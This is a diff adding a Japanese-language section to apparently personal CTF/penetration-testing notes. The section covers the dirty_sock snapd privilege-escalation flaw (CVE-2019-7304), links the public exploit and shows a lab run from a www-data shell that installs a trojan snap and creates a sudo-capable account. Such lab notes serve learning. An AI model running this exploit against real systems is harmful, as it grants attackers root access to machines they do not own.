@@ -1068,3 +1068,42 @@ https://tryhackme.com/room/atlas
 エクスプロイト  
 https://github.com/MuirlandOracle/CVE-2019-17662
 
+## CVE-2019-7304 (dirty_sock)
+
+linpeasの脆弱性CVE候補として出てくるが、正直、バージョン等による有効性の見分けはできないと思う。マニュアル列挙で確認し尽くした後の最後の手段という感じ。
+
+https://initblog.com/2019/dirty-sock/
+
+エクスプロイト  
+https://github.com/initstring/dirty_sock
+
+```sh
+www-data@petshop:/tmp$ python3 ./dirty2.py
+
+      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
+      |  \ | |__/  |   \_/      [__  |  | |    |_/  
+      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
+                       (version 2)
+
+//=========[]==========================================\\
+|| R&D     || initstring (@init_string)                ||
+|| Source  || https://github.com/initstring/dirty_sock ||
+|| Details || https://initblog.com/2019/dirty-sock     ||
+\\=========[]==========================================//
+
+
+[+] Slipped dirty sock on random socket file: /tmp/gtovmzujdl;uid=0;
+[+] Binding to socket file...
+[+] Connecting to snapd API...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+[+] Installing the trojan snap (and sleeping 8 seconds)...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+
+
+
+********************
+Success! You can now `su` to the following account and use sudo:
+   username: dirty_sock
+   password: dirty_sock
+********************
+```
